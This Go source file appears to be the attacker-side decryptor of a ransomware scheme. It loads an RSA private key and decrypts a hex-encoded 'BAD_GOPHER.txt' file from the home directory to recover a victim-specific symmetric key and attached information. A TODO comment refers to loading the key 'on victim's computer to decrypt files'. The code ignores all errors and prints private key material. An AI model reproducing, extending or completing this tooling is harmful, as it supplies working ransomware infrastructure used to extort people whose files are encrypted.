package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/hex"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	"os"
)

func main() {
	privRaw, _ := ioutil.ReadFile("priv.pem")
	fmt.Println(privRaw)
	privPem, _ := pem.Decode(privRaw)
	fmt.Println(privPem)

	privKey, _ := x509.ParsePKCS1PrivateKey(privPem.Bytes)
	fmt.Println(privKey.D)

	home, _ := os.UserHomeDir()
	keyFile, _ := os.Open(home + "/BAD_GOPHER.txt")
	keyFileText, _ := ioutil.ReadAll(keyFile)
	keyFileBytes, _ := hex.DecodeString(string(keyFileText))
	plaintext, _ := rsa.DecryptOAEP(sha256.New(), rand.Reader, privKey, keyFileBytes, nil)

	information := plaintext[:len(plaintext)-32]
	symmetricKey := plaintext[len(plaintext)-32:]
	fmt.Printf("Information:\n%s\n", information)
	fmt.Printf("Symmetric Key: %x", symmetricKey)

	// TODO: Save symmetric key to a file that can be loaded on victim's computer to decrypt files
}
